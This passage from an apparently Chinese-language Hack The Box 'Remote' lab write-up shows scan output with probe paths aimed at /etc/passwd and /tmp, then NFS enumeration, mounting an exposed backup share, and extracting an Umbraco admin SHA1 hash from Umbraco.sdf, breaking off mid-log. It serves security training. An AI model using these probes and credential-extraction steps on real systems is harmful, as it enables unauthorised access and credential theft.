/jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo<br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">19</span>] <span class="hljs-number">400</span> -    <span class="hljs-number">3</span>KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable<br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">19</span>] <span class="hljs-number">400</span> -    <span class="hljs-number">3</span>KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned<br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">19</span>] <span class="hljs-number">400</span> -    <span class="hljs-number">3</span>KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd<br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">19</span>] <span class="hljs-number">400</span> -    <span class="hljs-number">3</span>KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/help<span class="hljs-comment">/*</span><br><span class="hljs-comment">[10:20:19] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties</span><br><span class="hljs-comment">[10:20:19] 400 -    3KB - /jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used</span><br><span class="hljs-comment">[10:20:19] 400 -    3KB - /jolokia/write/java.lang:type=Memory/Verbose/true</span><br><span class="hljs-comment">[10:20:19] 400 -    3KB - /jolokia/exec/java.lang:type=Memory/gc</span><br><span class="hljs-comment">[10:20:19] 400 -    3KB - /jolokia/search/*:j2eeType=J2EEServer,*</span><br><span class="hljs-comment">[10:20:19] 400 -    3KB - /jolokia/read/java.lang:type=*/</span>HeapMemoryUsage<br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">26</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - /login.wdm%<span class="hljs-number">20</span>                                     <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">26</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - /login.wdm%<span class="hljs-number">2</span>e                                     <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">31</span>] <span class="hljs-number">500</span> -    <span class="hljs-number">3</span>KB - /master/                                          <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">47</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - /people                                           <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">57</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - /products                                         <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">57</span>] <span class="hljs-number">500</span> -    <span class="hljs-number">3</span>KB - /product<br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">57</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - /products.aspx                                    <br>[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>:<span class="hljs-number">58</span>] <span class="hljs-number">500</span> -    <span class="hljs-number">3</span>KB - /product.aspx<br>[<span class="hljs-number">10</span>:<span class="hljs-number">21</span>:<span class="hljs-number">00</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - /rating_over.                                     <br>[<span class="hljs-number">10</span>:<span class="hljs-number">21</span>:<span class="hljs-number">07</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - /service.asmx                                     <br>[<span class="hljs-number">10</span>:<span class="hljs-number">21</span>:<span class="hljs-number">15</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - /<span class="hljs-type">static</span>..                                         <br>[<span class="hljs-number">10</span>:<span class="hljs-number">21</span>:<span class="hljs-number">24</span>] <span class="hljs-number">403</span> -    <span class="hljs-number">2</span>KB - /Trace.axd                                        <br>[<span class="hljs-number">10</span>:<span class="hljs-number">21</span>:<span class="hljs-number">24</span>] <span class="hljs-number">400</span> -    <span class="hljs-number">3</span>KB - /Trace.axd::$DATA                                 <br>[<span class="hljs-number">10</span>:<span class="hljs-number">21</span>:<span class="hljs-number">28</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">6</span>KB - /umbraco/webservices/codeEditorSave.asmx          <br>[<span class="hljs-number">10</span>:<span class="hljs-number">21</span>:<span class="hljs-number">44</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - /WEB-INF./web.xml                                 <br>[<span class="hljs-number">10</span>:<span class="hljs-number">21</span>:<span class="hljs-number">44</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - /WEB-INF./<br>[<span class="hljs-number">10</span>:<span class="hljs-number">21</span>:<span class="hljs-number">46</span>] <span class="hljs-number">400</span> -    <span class="hljs-number">3</span>KB - /web.config::$DATA                                <br>[<span class="hljs-number">10</span>:<span class="hljs-number">21</span>:<span class="hljs-number">47</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - /WebResource.axd?d=LER8t9aS                       <br>                                                                             <br>Task Completed<br></code></pre></td></tr></table></figure>
+
+<p>5、发现个 umbraco 的目录服务</p>
+<p><code>http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms</code></p>
+<p><img src="http://sh1yan.top/photo/Remote-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、这里基本上就没思路了，不过前面其实遗漏了一个端口信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p2049 -sC -sV <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span>                                                  <br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-03-16 20:53 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span><br>Host is up (<span class="hljs-number">0.29</span>s latency).<br><br>PORT     STATE SERVICE VERSION<br><span class="hljs-number">2049</span>/tcp open  nfs     <span class="hljs-number">2</span><span class="hljs-number">-4</span> (RPC #<span class="hljs-number">100003</span>)<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">11.80</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>7、是的也就是上一个靶场，我们刚刚练习过的技能，磁盘挂载技术</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># https:<span class="hljs-comment">//book.hacktricks.xyz/v/cn/network-services-pentesting/nfs-service-pentesting#gua-zai</span></span><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ showmount -e <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span>  <br>Export <span class="hljs-built_in">list</span> <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span>:<br>/site_backups (everyone)<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo mkdir /mnt/new_back             <br>[sudo] kali 的密码：<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo mount -t nfs <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span>:/site_backups /mnt/new_back -o nolock <br>                                                                                                               <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ls -la /mnt/new_back <br>总计 <span class="hljs-number">123</span><br>drwx------ <span class="hljs-number">2</span> nobody nogroup  <span class="hljs-number">4096</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">24</span>日 .<br>drwxr-xr-x <span class="hljs-number">3</span> root   root     <span class="hljs-number">4096</span>  <span class="hljs-number">3</span>月<span class="hljs-number">16</span>日 <span class="hljs-number">21</span>:<span class="hljs-number">09</span> ..<br>drwx------ <span class="hljs-number">2</span> nobody nogroup    <span class="hljs-number">64</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 App_Browsers<br>drwx------ <span class="hljs-number">2</span> nobody nogroup  <span class="hljs-number">4096</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 App_Data<br>drwx------ <span class="hljs-number">2</span> nobody nogroup  <span class="hljs-number">4096</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 App_Plugins<br>drwx------ <span class="hljs-number">2</span> nobody nogroup    <span class="hljs-number">64</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 aspnet_client<br>drwx------ <span class="hljs-number">2</span> nobody nogroup <span class="hljs-number">49152</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 bin<br>drwx------ <span class="hljs-number">2</span> nobody nogroup  <span class="hljs-number">8192</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 Config<br>drwx------ <span class="hljs-number">2</span> nobody nogroup    <span class="hljs-number">64</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 css<br>-rwx------ <span class="hljs-number">1</span> nobody nogroup   <span class="hljs-number">152</span> <span class="hljs-number">2018</span>年<span class="hljs-number">11</span>月 <span class="hljs-number">2</span>日 <span class="hljs-keyword">default</span>.aspx<br>-rwx------ <span class="hljs-number">1</span> nobody nogroup    <span class="hljs-number">89</span> <span class="hljs-number">2018</span>年<span class="hljs-number">11</span>月 <span class="hljs-number">2</span>日 Global.asax<br>drwx------ <span class="hljs-number">2</span> nobody nogroup  <span class="hljs-number">4096</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 Media<br>drwx------ <span class="hljs-number">2</span> nobody nogroup    <span class="hljs-number">64</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 scripts<br>drwx------ <span class="hljs-number">2</span> nobody nogroup  <span class="hljs-number">8192</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 Umbraco<br>drwx------ <span class="hljs-number">2</span> nobody nogroup  <span class="hljs-number">4096</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 Umbraco_Client<br>drwx------ <span class="hljs-number">2</span> nobody nogroup  <span class="hljs-number">4096</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 Views<br>-rwx------ <span class="hljs-number">1</span> nobody nogroup <span class="hljs-number">28539</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">20</span>日 Web.config<br><br></code></pre></td></tr></table></figure>
+
+<p>8、这里省略一部分的无意义的枚举，其实这里应该能看到是一个网站的源码目录，结合思路上 应该是需要找 Umbraco 凭证文件 才对。</p>
+<p><code>https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials</code></p>
+<p><code>您的连接字符串清楚地表明您正在使用默认的 SQL Server CE 数据库 ( Umbraco.sdf)。Umbraco.sdf您可以在文件夹中找到该文件/App_Data。</code></p>
+<p>9、根据提示开始翻阅凭证文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[/mnt/new_back]<br>└─$ cd App_Data           <br>                                                                                                               <br>┌──(kali㉿offsec)-[/mnt/new_back/App_Data]<br>└─$ ls -la<br>总计 <span class="hljs-number">1977</span><br>drwx------ <span class="hljs-number">2</span> nobody nogroup    <span class="hljs-number">4096</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 .<br>drwx------ <span class="hljs-number">2</span> nobody nogroup    <span class="hljs-number">4096</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">24</span>日 ..<br>drwx------ <span class="hljs-number">2</span> nobody nogroup      <span class="hljs-number">64</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 cache<br>drwx------ <span class="hljs-number">2</span> nobody nogroup    <span class="hljs-number">4096</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 Logs<br>drwx------ <span class="hljs-number">2</span> nobody nogroup    <span class="hljs-number">4096</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 Models<br>drwx------ <span class="hljs-number">2</span> nobody nogroup      <span class="hljs-number">64</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 packages<br>drwx------ <span class="hljs-number">2</span> nobody nogroup    <span class="hljs-number">4096</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">21</span>日 TEMP<br>-rwx------ <span class="hljs-number">1</span> nobody nogroup   <span class="hljs-number">36832</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">20</span>日 umbraco.config<br>-rwx------ <span class="hljs-number">1</span> nobody nogroup <span class="hljs-number">1965978</span> <span class="hljs-number">2020</span>年 <span class="hljs-number">2</span>月<span class="hljs-number">20</span>日 Umbraco.sdf<br>                                                                                                               <br>┌──(kali㉿offsec)-[/mnt/new_back/App_Data]<br>└─$ cp Umbraco.sdf ~/Desktop/           <br>                                                                                                               <br>┌──(kali㉿offsec)-[/mnt/new_back/App_Data]<br>└─$ cp umbraco.config ~/Desktop/<br></code></pre></td></tr></table></figure>
+
+<p>10、查看凭证里的管理员账号信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ strings Umbraco.sdf | grep admin <br>Administratoradmindefaulten-US<br>Administratoradmindefaulten-USb22924d5<span class="hljs-number">-57</span>de<span class="hljs-number">-468e-9</span>df4<span class="hljs-number">-0961</span>cf6aa30d<br>Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="hljs-string">&quot;hashAlgorithm&quot;</span>:<span class="hljs-string">&quot;SHA1&quot;</span>&#125;en-USf8512f97-cab1<span class="hljs-number">-4</span>a4b-a49f<span class="hljs-number">-0</span>a2054c47a1d<br>adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="hljs-string">&quot;hashAlgorithm&quot;</span>:<span class="hljs-string">&quot;SHA1&quot;</span>&#125;admin@htb.localen-USfeb1a998-d3bf<span class="hljs-number">-406</span>a-b30b-e269d7abdf50<br>adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="hljs-string">&quot;hashAlgorithm&quot;</span>:<span class="hljs-string">&quot;SHA1&quot;</span>&#125;admin@htb.localen-US82756c26<span class="hljs-number">-4321</span><span class="hljs-number">-4</span>d27-b429<span class="hljs-number">-1b</span>5c7c4f882f<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/password/changepassword change<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating SessionTimeout, SecurityStamp, CreateDate, UpdateDate, Id, HasIdentity<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating Key, IsApproved, Groups, UpdateDate; groups assigned: writer<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/password/changepassword change<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating Key, Groups, UpdateDate; groups assigned: writer<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;ssmith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating Name, Key, Groups, UpdateDate; groups assigned: writer<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;ssmith&quot;</span> &lt;ssmith@htb.local&gt;umbraco/user/saveupdating Username, Email, Key, Groups, UpdateDate; groups assigned: writer<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;ssmith&quot;</span> &lt;ssmith@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;ssmith&quot;</span> &lt;ssmith@htb.local&gt;umbraco/user/password/changepassword change<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;ssmith&quot;</span> &lt;ssmith@htb.local&gt;umbraco/user/saveupdating Key, Groups, UpdateDate; groups assigned: writer<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate<br>User <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success<br>User <span class="hljs-string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.1U</span>ser <span class="hljs-string">&quot;admin&quot;</span> 